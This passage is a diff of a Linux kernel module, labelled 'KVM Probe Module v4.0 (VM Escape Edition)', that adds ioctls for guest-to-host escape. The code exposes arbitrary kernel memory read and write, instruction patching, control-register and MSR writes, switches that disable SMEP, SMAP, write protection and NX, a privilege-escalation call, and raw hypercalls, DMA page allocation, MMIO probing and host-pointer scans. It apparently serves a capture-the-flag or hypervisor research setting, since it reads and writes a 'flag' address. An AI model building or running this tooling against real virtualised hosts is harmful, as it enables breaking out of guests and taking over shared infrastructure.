-            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
@@ -920,7 +907,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (copy_to_user((struct port_io_data __user *)arg, &p_io_data_kernel, sizeof(p_io_data_kernel))) {
                 return -EFAULT;
             }
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             break;
 
         case IOCTL_WRITE_PORT:
@@ -935,7 +922,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 case 2: outw((u16)p_io_data_kernel.value, p_io_data_kernel.port); break;
                 case 4: outl((u32)p_io_data_kernel.value, p_io_data_kernel.port); break;
             }
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             break;
 
         case IOCTL_READ_MMIO: {
@@ -968,7 +955,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
 
             kfree(kbuf);
             iounmap(mmio);
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             return 0;
         }
 
@@ -1025,7 +1012,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             }
 
             iounmap(mapped_addr);
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             return 0;
         }
 
@@ -1041,14 +1028,13 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EINVAL;
             }
 
-            /* Apply KASLR slide automatically */
             actual_addr = apply_kaslr_slide(req.kernel_addr);
 
             if (copy_to_user(req.user_buf, (void *)actual_addr, req.length)) {
                 return -EFAULT;
             }
 
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             break;
         }
 
@@ -1065,7 +1051,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EINVAL;
             }
 
-            /* Apply KASLR slide automatically */
             actual_addr = apply_kaslr_slide(req.kernel_addr);
 
             tmp = kmalloc(req.length, GFP_KERNEL);
@@ -1080,7 +1065,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
 
             memcpy((void *)actual_addr, tmp, req.length);
             kfree(tmp);
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             break;
         }
 
@@ -1113,7 +1098,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EFAULT;
             }
 
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             break;
         }
 
@@ -1124,7 +1109,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 g_vq_phys_addr = 0;
                 g_vq_pfn = 0;
             }
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             break;
         }
 
@@ -1152,7 +1137,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             kernel_desc_ptr_local->flags = cpu_to_le16(user_desc_data_kernel.flags);
             kernel_desc_ptr_local->next = cpu_to_le16(user_desc_data_kernel.next_idx);
 
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             break;
         }
 
@@ -1165,88 +1150,16 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             break;
         }
 
-        case IOCTL_SCAN_VA: {
-            struct va_scan_data va_req;
-            void *src;
-            unsigned char *tmp;
-            unsigned long actual_addr;
-
-            if (copy_from_user(&va_req, (struct va_scan_data __user *)arg, sizeof(va_req))) {
-                return -EFAULT;
-            }
-
-            if (!va_req.va || !va_req.size || !va_req.user_buffer) {
-                return -EINVAL;
-            }
-
-            /* Apply KASLR slide automatically */
-            actual_addr = apply_kaslr_slide(va_req.va);
-
-            src = (void *)actual_addr;
-            tmp = kmalloc(va_req.size, GFP_KERNEL);
-            if (!tmp) {
-                return -ENOMEM;
-            }
-
-            memcpy(tmp, src, va_req.size);
-
-            if (copy_to_user(va_req.user_buffer, tmp, va_req.size)) {
-                kfree(tmp);
-                return -EFAULT;
-            }
-
-            kfree(tmp);
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
-        }
-
-        case IOCTL_WRITE_VA: {
-            struct va_write_data wa_req;
-            unsigned long actual_addr;
-            unsigned char *tmp;
-
-            if (copy_from_user(&wa_req, (struct va_write_data __user *)arg, sizeof(wa_req))) {
-                return -EFAULT;
-            }
-
-            if (!wa_req.va || !wa_req.size || !wa_req.user_buffer) {
-                return -EINVAL;
-            }
-
-            /* Apply KASLR slide automatically */
-            actual_addr = apply_kaslr_slide(wa_req.va);
-
-            tmp = kmalloc(wa_req.size, GFP_KERNEL);
-            if (!tmp) {
-                return -ENOMEM;
-            }
-
-            if (copy_from_user(tmp, wa_req.user_buffer, wa_req.size)) {
-                kfree(tmp);
-                return -EFAULT;
-            }
-
-            memcpy((void *)actual_addr, tmp, wa_req.size);
-            kfree(tmp);
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
-        }
-            case IOCTL_GET_CURRENT_TASK: {
-                unsigned long current_task = (unsigned long)current;
-                return copy_to_user((void __user *)arg, &current_task, sizeof(current_task)) ? -EFAULT : 0;
-            }
-
         case IOCTL_HYPERCALL_ARGS: {
             struct hypercall_args args;
-            long ret;
 
             if (copy_from_user(&args, (void __user *)arg, sizeof(args))) {
                 return -EFAULT;
             }
 
-            ret = do_hypercall(&args);
+            do_hypercall(&args);
 
-            if (copy_to_user((void __user *)arg, &ret, sizeof(ret))) {
+            if (copy_to_user((void __user *)arg, &args, sizeof(args))) {
                 return -EFAULT;
             }
             break;
@@ -1263,7 +1176,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EINVAL;
             }
 
-            /* Only handle kernel addresses */
             if (is_kernel_address(va)) {
                 pa = virt_to_phys((void *)va);
                 return copy_to_user((void __user *)arg, &pa, sizeof(pa)) ? -EFAULT : 0;
@@ -1272,169 +1184,74 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             }
         }
 
-        case IOCTL_WRITE_FLAG_ADDR: {
-            unsigned long val;
+        case IOCTL_SCAN_VA: {
+            struct va_scan_data va_req;
+            void *src;
+            unsigned char *tmp;
             unsigned long actual_addr;
 
-            if (g_symbol_write_flag) {
-                if (copy_from_user(&val, (void __user *)arg, sizeof(val))) {
-                    return -EFAULT;
-                }
-
-                /* Use cached symbol address */
-                actual_addr = g_symbol_write_flag;
-                *((unsigned long *)actual_addr) = val;
-                trigger_hypercall(); /* Trigger hypercall after operation */
-                return 0;
-            } else {
-                return -ENOENT;
-            }
-        }
-
-        case IOCTL_READ_FLAG_ADDR: {
-            if (g_symbol_write_flag) {
-                unsigned long val = *((unsigned long *)g_symbol_write_flag);
-                return copy_to_user((void __user *)arg, &val, sizeof(val)) ? -EFAULT : 0;
-            } else {
-                return -ENOENT;
-            }
-        }
-
-        case IOCTL_PATCH_INSTRUCTIONS: {
-            struct patch_req req;
-            unsigned char *kbuf;
-            unsigned long actual_addr;
-
-            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+            if (copy_from_user(&va_req, (struct va_scan_data __user *)arg, sizeof(va_req))) {
                 return -EFAULT;
             }
 
-            if (!req.dst_va || !req.size || !req.user_buf || req.size > PAGE_SIZE) {
+            if (!va_req.va || !va_req.size || !va_req.user_buffer) {
                 return -EINVAL;
             }
 
-            /* Apply KASLR slide automatically */
-            actual_addr = apply_kaslr_slide(req.dst_va);
-
-            kbuf = kmalloc(req.size, GFP_KERNEL);
-            if (!kbuf) {
+            actual_addr = apply_kaslr_slide(va_req.va);
+            src = (void *)actual_addr;
+            
+            tmp = kmalloc(va_req.size, GFP_KERNEL);
+            if (!tmp) {
                 return -ENOMEM;
             }
 
-            if (copy_from_user(kbuf, req.user_buf, req.size)) {
-                kfree(kbuf);
+            memcpy(tmp, src, va_req.size);
+
+            if (copy_to_user(va_req.user_buffer, tmp, va_req.size)) {
+                kfree(tmp);
                 return -EFAULT;
             }
 
-            /* Direct memcpy without memory protection changes */
-            memcpy((void *)actual_addr, kbuf, req.size);
-
-            kfree(kbuf);
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            kfree(tmp);
+            trigger_hypercall();
             return 0;
         }
 
-        case IOCTL_DISABLE_SMEP:
-            disable_smep();
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
+        case IOCTL_WRITE_VA: {
+            struct va_write_data wa_req;
+            unsigned long actual_addr;
+            unsigned char *tmp;
 
-        case IOCTL_ENABLE_SMEP:
-            enable_smep();
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
-
-        case IOCTL_DISABLE_SMAP:
-            disable_smap();
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
-
-        case IOCTL_ENABLE_SMAP:
-            enable_smap();
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
-
-        case IOCTL_DISABLE_WP:
-            disable_wp();
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
-
-        case IOCTL_ENABLE_WP:
-            enable_wp();
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
-
-        case IOCTL_READ_CR4: {
-#ifdef CONFIG_X86
-            unsigned long cr4 = my_read_cr4();
-            return copy_to_user((void __user *)arg, &cr4, sizeof(cr4)) ? -EFAULT : 0;
-#else
-            return -ENOSYS;
-#endif
-        }
-
-        case IOCTL_WRITE_CR4: {
-#ifdef CONFIG_X86
-            unsigned long cr4;
-            if (copy_from_user(&cr4, (void __user *)arg, sizeof(cr4))) {
+            if (copy_from_user(&wa_req, (struct va_write_data __user *)arg, sizeof(wa_req))) {
                 return -EFAULT;
             }
-            my_write_cr4(cr4);
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
-#else
-            return -ENOSYS;
-#endif
-        }
 
-        case IOCTL_READ_CR0: {
-#ifdef CONFIG_X86
-            unsigned long cr0 = my_read_cr0();
-            return copy_to_user((void __user *)arg, &cr0, sizeof(cr0)) ? -EFAULT : 0;
-#else
-            return -ENOSYS;
-#endif
-        }
+            if (!wa_req.va || !wa_req.size || !wa_req.user_buffer) {
+                return -EINVAL;
+            }
 
-        case IOCTL_WRITE_CR0: {
-#ifdef CONFIG_X86
-            unsigned long cr0;
-            if (copy_from_user(&cr0, (void __user *)arg, sizeof(cr0))) {
+            actual_addr = apply_kaslr_slide(wa_req.va);
+
+            tmp = kmalloc(wa_req.size, GFP_KERNEL);
+            if (!tmp) {
+                return -ENOMEM;
+            }
+
+            if (copy_from_user(tmp, wa_req.user_buffer, wa_req.size)) {
+                kfree(tmp);
                 return -EFAULT;
             }
-            my_write_cr0(cr0);
-            trigger_hypercall(); /* Trigger hypercall after operation */
+
+            memcpy((void *)actual_addr, tmp, wa_req.size);
+            kfree(tmp);
+            trigger_hypercall();
             return 0;
-#else
-            return -ENOSYS;
-#endif
         }
 
-        case IOCTL_READ_MSR: {
-#ifdef CONFIG_X86
-            struct msr_data msr_req;
-            if (copy_from_user(&msr_req, (void __user *)arg, sizeof(msr_req))) {
-                return -EFAULT;
-            }
-            msr_req.value = my_rdmsr(msr_req.msr);
-            return copy_to_user((void __user *)arg, &msr_req, sizeof(msr_req)) ? -EFAULT : 0;
-#else
-            return -ENOSYS;
-#endif
-        }
-
-        case IOCTL_WRITE_MSR: {
-#ifdef CONFIG_X86
-            struct msr_data msr_req;
-            if (copy_from_user(&msr_req, (void __user *)arg, sizeof(msr_req))) {
-                return -EFAULT;
-            }
-            my_wrmsr(msr_req.msr, msr_req.value);
-            trigger_hypercall(); /* Trigger hypercall after operation */
-            return 0;
-#else
-            return -ENOSYS;
-#endif
+        case IOCTL_GET_CURRENT_TASK: {
+            unsigned long current_task = (unsigned long)current;
+            return copy_to_user((void __user *)arg, &current_task, sizeof(current_task)) ? -EFAULT : 0;
         }
 
         case IOCTL_READ_PHYSICAL: {
@@ -1465,7 +1282,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             }
 
             kfree(kbuf);
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             return 0;
         }
 
@@ -1497,27 +1314,123 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             }
 
             kfree(kbuf);
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             return 0;
         }
 
         case IOCTL_ALLOC_ROOT_PAGES: {
             unsigned long __user *user_pages = (unsigned long __user *)arg;
-            int count = 8; /* Default count */
+            int count = 8;
             return alloc_root_pages(user_pages, count);
         }
 
+        /* Protection control IOCTLs */
+        case IOCTL_DISABLE_SMEP:
+            disable_smep();
+            return 0;
+
+        case IOCTL_ENABLE_SMEP:
+            enable_smep();
+            return 0;
+
+        case IOCTL_DISABLE_SMAP:
+            disable_smap();
+            return 0;
+
+        case IOCTL_ENABLE_SMAP:
+            enable_smap();
+            return 0;
+
+        case IOCTL_DISABLE_WP:
+            disable_wp();
+            return 0;
+
+        case IOCTL_ENABLE_WP:
+            enable_wp();
+            return 0;
+
         case IOCTL_ENABLE_NX:
             enable_nx();
-            check_protection_status();
-            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         case IOCTL_DISABLE_NX:
             disable_nx();
-            check_protection_status();
-            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
+
+        case IOCTL_READ_CR0: {
+#ifdef CONFIG_X86
+            unsigned long cr0 = my_read_cr0();
+            return copy_to_user((void __user *)arg, &cr0, sizeof(cr0)) ? -EFAULT : 0;
+#else
+            return -ENOSYS;
+#endif
+        }
+
+        case IOCTL_WRITE_CR0: {
+#ifdef CONFIG_X86
+            unsigned long cr0;
+            if (copy_from_user(&cr0, (void __user *)arg, sizeof(cr0))) {
+                return -EFAULT;
+            }
+            my_write_cr0(cr0);
+            return 0;
+#else
+            return -ENOSYS;
+#endif
+        }
+
+        case IOCTL_READ_CR4: {
+#ifdef CONFIG_X86
+            unsigned long cr4 = my_read_cr4();
+            return copy_to_user((void __user *)arg, &cr4, sizeof(cr4)) ? -EFAULT : 0;
+#else
+            return -ENOSYS;
+#endif
+        }
+
+        case IOCTL_WRITE_CR4: {
+#ifdef CONFIG_X86
+            unsigned long cr4;
+            if (copy_from_user(&cr4, (void __user *)arg, sizeof(cr4))) {
+                return -EFAULT;
+            }
+            my_write_cr4(cr4);
+            return 0;
+#else
+            return -ENOSYS;
+#endif
+        }
+
+        case IOCTL_READ_CR2: {
+#ifdef CONFIG_X86
+            unsigned long cr2 = my_read_cr2();
+            return copy_to_user((void __user *)arg, &cr2, sizeof(cr2)) ? -EFAULT : 0;
+#else
+            return -ENOSYS;
+#endif
+        }
+
+        case IOCTL_READ_CR3: {
+#ifdef CONFIG_X86
+            unsigned long cr3 = my_read_cr3();
+            return copy_to_user((void __user *)arg, &cr3, sizeof(cr3)) ? -EFAULT : 0;
+#else
+            return -ENOSYS;
+#endif
+        }
+
+        case IOCTL_WRITE_CR3: {
+#ifdef CONFIG_X86
+            unsigned long cr3;
+            if (copy_from_user(&cr3, (void __user *)arg, sizeof(cr3))) {
+                return -EFAULT;
+            }
+            my_write_cr3(cr3);
+            return 0;
+#else
+            return -ENOSYS;
+#endif
+        }
 
         case IOCTL_READ_EFER: {
 #ifdef CONFIG_X86
@@ -1535,22 +1448,153 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EFAULT;
             }
             my_wrmsr(MSR_EFER, efer);
-            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 #else
             return -ENOSYS;
 #endif
         }
 
-        case IOCTL_CHECK_STATUS:
-            check_protection_status();
-            trigger_hypercall(); /* Trigger hypercall after operation */
+        case IOCTL_READ_MSR: {
+#ifdef CONFIG_X86
+            struct msr_data msr_req;
+            if (copy_from_user(&msr_req, (void __user *)arg, sizeof(msr_req))) {
+                return -EFAULT;
+            }
+            msr_req.value = my_rdmsr(msr_req.msr);
+            return copy_to_user((void __user *)arg, &msr_req, sizeof(msr_req)) ? -EFAULT : 0;
+#else
+            return -ENOSYS;
+#endif
+        }
+
+        case IOCTL_WRITE_MSR: {
+#ifdef CONFIG_X86
+            struct msr_data msr_req;
+            if (copy_from_user(&msr_req, (void __user *)arg, sizeof(msr_req))) {
+                return -EFAULT;
+            }
+            my_wrmsr(msr_req.msr, msr_req.value);
             return 0;
+#else
+            return -ENOSYS;
+#endif
+        }
 
         case IOCTL_ESCALATE_PRIVILEGES:
             escalate_privileges();
-            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
+
+        case IOCTL_CHECK_STATUS:
+            return 0;
+
+        case IOCTL_READ_FLAG_ADDR: {
+            if (g_symbol_write_flag) {
+                unsigned long val = *((unsigned long *)g_symbol_write_flag);
+                return copy_to_user((void __user *)arg, &val, sizeof(val)) ? -EFAULT : 0;
+            } else {
+                return -ENOENT;
+            }
+        }
+
+        case IOCTL_WRITE_FLAG_ADDR: {
+            unsigned long val;
+            if (g_symbol_write_flag) {
+                if (copy_from_user(&val, (void __user *)arg, sizeof(val))) {
+                    return -EFAULT;
+                }
+                *((unsigned long *)g_symbol_write_flag) = val;
+                trigger_hypercall();
+                return 0;
+            } else {
+                return -ENOENT;
+            }
+        }
+
+        case IOCTL_PATCH_INSTRUCTIONS: {
+            struct patch_req req;
+            unsigned char *kbuf;
+            unsigned long actual_addr;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (!req.dst_va || !req.size || !req.user_buf || req.size > PAGE_SIZE) {
+                return -EINVAL;
+            }
+
+            actual_addr = apply_kaslr_slide(req.dst_va);
+
+            kbuf = kmalloc(req.size, GFP_KERNEL);
+            if (!kbuf) {
+                return -ENOMEM;
+            }
+
+            if (copy_from_user(kbuf, req.user_buf, req.size)) {
+                kfree(kbuf);
+                return -EFAULT;
+            }
+
+            memcpy((void *)actual_addr, kbuf, req.size);
+            kfree(kbuf);
+            trigger_hypercall();
+            return 0;
+        }
+
+        /* New VM escape IOCTLs */
+        case IOCTL_ALLOC_DMA_PAGES: {
+            struct dma_alloc_req req;
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+            return alloc_dma_pages(req.count, req.addrs);
+        }
+
+        case IOCTL_FREE_DMA_PAGES:
+            free_dma_pages();
+            return 0;
+
+        case IOCTL_PROBE_MMIO_RANGE: {
+            struct mmio_probe_req req;
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+            return probe_mmio_range(&req);
+        }
+
+        case IOCTL_SCAN_HOST_PTRS: {
+            struct host_ptr_scan scan;
+            if (copy_from_user(&scan, (void __user *)arg, sizeof(scan))) {
+                return -EFAULT;
+            }
+            return scan_for_host_ptrs(&scan);
+        }
+
+        case IOCTL_RAW_VMCALL: {
+            struct hypercall_args args;
+            if (copy_from_user(&args, (void __user *)arg, sizeof(args))) {
+                return -EFAULT;
+            }
+            args.result = kvm_hypercall_vmcall(args.nr, args.arg0, args.arg1,
+                                                args.arg2, args.arg3);
+            if (copy_to_user((void __user *)arg, &args, sizeof(args))) {
+                return -EFAULT;
+            }
+            return 0;
+        }
+
+        case IOCTL_RAW_VMMCALL: {
+            struct hypercall_args args;
+            if (copy_from_user(&args, (void __user *)arg, sizeof(args))) {
+                return -EFAULT;
+            }
+            args.result = kvm_hypercall_vmmcall(args.nr, args.arg0, args.arg1,
+                                                 args.arg2, args.arg3);
+            if (copy_to_user((void __user *)arg, &args, sizeof(args))) {
+                return -EFAULT;
+            }
+            return 0;
+        }
 
         default:
             return -EINVAL;
@@ -1575,9 +1619,9 @@ static struct file_operations fops = {
 static int __init mod_init(void) {
     int ret;
 
-    printk(KERN_INFO "%s: Initializing KVM Probe Module v3.2\n", DRIVER_NAME);
+    printk(KERN_INFO "%s: Initializing KVM Probe Module v4.0 (VM Escape Edition)\n", DRIVER_NAME);
 
-    /* Initialize protection tracking variables */
+    /* Initialize protection tracking */
     g_original_cr4 = 0;
     g_original_cr0 = 0;
     g_original_efer = 0;
@@ -1586,23 +1630,22 @@ static int __init mod_init(void) {
     g_wp_disabled = false;
     g_nx_enabled = false;
 
-    /* Initialize kallsyms lookup for modern kernels */
+    /* Initialize kallsyms lookup */
     ret = kallsyms_lookup_init();
     if (ret < 0) {
-        printk(KERN_WARNING "%s: kallsyms_lookup initialization failed, some features may not work\n", DRIVER_NAME);
+        printk(KERN_WARNING "%s: kallsyms_lookup initialization failed\n", DRIVER_NAME);
     }
 
-    /* Initialize KASLR slide detection */
+    /* Initialize KASLR slide */
     ret = init_kaslr_slide();
     if (ret < 0) {
-        printk(KERN_WARNING "%s: KASLR slide detection failed, some features may not work correctly\n", DRIVER_NAME);
+        printk(KERN_WARNING "%s: KASLR slide detection failed\n", DRIVER_NAME);
+    } else {
+        printk(KERN_INFO "%s: KASLR slide: 0x%lx\n", DRIVER_NAME, g_kaslr_slide);
     }
 
-    /* Cache important kernel symbols */
-    ret = cache_important_symbols();
-    if (ret < 0) {
-        printk(KERN_WARNING "%s: Failed to cache some kernel symbols\n", DRIVER_NAME);
-    }
+    /* Cache important symbols */
+    cache_important_symbols();
 
     /* Register character device */
     major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
@@ -1632,6 +1675,9 @@ static int __init mod_init(void) {
     g_vq_virt_addr = NULL;
     g_vq_phys_addr = 0;
     g_vq_pfn = 0;
+    g_dma_page_count = 0;
+    memset(g_dma_pages, 0, sizeof(g_dma_pages));
+    memset(g_dma_addrs, 0, sizeof(g_dma_addrs));
 
     printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d\n",
            DRIVER_NAME, DEVICE_FILE_NAME, major_num);
@@ -1642,16 +1688,17 @@ static int __init mod_init(void) {
 static void __exit mod_exit(void) {
     printk(KERN_INFO "%s: Unloading KVM Probe Module\n", DRIVER_NAME);
 
-    /* Restore any disabled protections */
+    /* Restore protections */
     restore_protections();
 
-    /* Free VQ page if allocated */
+    /* Free VQ page */
     if (g_vq_virt_addr) {
         free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
         g_vq_virt_addr = NULL;
-        g_vq_phys_addr = 0;
-        g_vq_pfn = 0;
     }
+
+    /* Free DMA pages */
+    free_dma_pages();
 
     /* Destroy device */
     if (driver_device) {
